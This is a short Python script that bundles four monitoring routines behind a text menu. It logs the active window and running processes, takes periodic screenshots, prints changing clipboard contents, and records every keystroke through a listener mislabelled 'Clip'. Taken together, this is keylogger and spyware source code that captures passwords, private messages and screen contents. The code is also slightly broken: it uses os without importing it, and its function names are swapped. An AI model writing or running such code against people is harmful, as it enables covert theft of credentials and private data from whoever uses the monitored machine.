import pyperclip
import time
from pynput import keyboard
import psutil
import pygetwindow as gw
from PIL import ImageGrab

def Windows():
    previous_window = None
    while True:
        time.sleep(5)
        current_window = gw.getActiveWindowTitle()
        if current_window != previous_window:
            previous_window = current_window
            print(f'Active window: {current_window}')
        for proc in psutil.process_iter(['pid', 'name']):
            print(f'Running process: {proc.info["name"]} (PID: {proc.info["pid"]})')

def ScreenS():
    while True:
        time.sleep(60)
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join("screenshots", f"screenshot_{int(time.time())}.png"))
def Copy():
    rec=""
    while True:
        time.sleep(5)
        cur=pyperclip.paste()
        if rec !=cur:
            rec=cur
            print(rec)
def Clip():
    def on_press(key):
        try:
            print(f'Key pressed: {key.char}')
        except AttributeError:
            print(f'Special key pressed: {key}')

    lis = keyboard.Listener(on_press=on_press)
    lis.start()
    lis.join()
def Run():
    choice = input("Enter function to run (Windows/ScreenS/Copy/Clip): ")
    if choice == "Windows":
        Windows()
    elif choice == "ScreenS":
        ScreenS()
    elif choice == "Copy":
        Copy()
    elif choice == "Clip":
        Clip()
